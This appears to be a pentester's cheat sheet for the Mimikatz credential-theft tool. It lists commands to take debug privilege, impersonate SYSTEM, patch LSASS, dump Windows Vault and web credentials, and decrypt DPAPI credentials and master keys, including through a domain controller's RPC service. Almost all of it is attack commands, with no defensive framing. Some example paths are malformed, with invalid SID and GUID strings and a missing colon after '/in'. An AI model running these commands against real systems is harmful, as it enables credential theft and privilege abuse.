# MIMIKATZ

## Author: https://github.com/gentilkiwi/mimikatz

### Miscellaneous

1) Shows privileges on machine ( Ensure output is "20 OK")

       privilege::debug

2) Impersonate SYSTEM

       token::elevate

De-escalate from SYSTEM

    token::revert

3) Altering LSASS Logic (Dump network share credentials, RDP passwords, etc. Not recommended.)

Prevent LSASS from checking the credential type

    sekurlsa::patch 

### Credentials Dumping

1) Windows Vault stored credentials dumping (passwords and authentication tokens)

       vault::cred

2) Web Credentials Dumping

       vault::list

3) Extract Credentials with DPAPI

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"

#### If dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption.

Extract the master key

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed"

BONUS: RPC for Domain Controllers

#### Domain controllers can decrypt master keys for authorized users using the RPC service.

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed" /rpc

Final decryption

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"



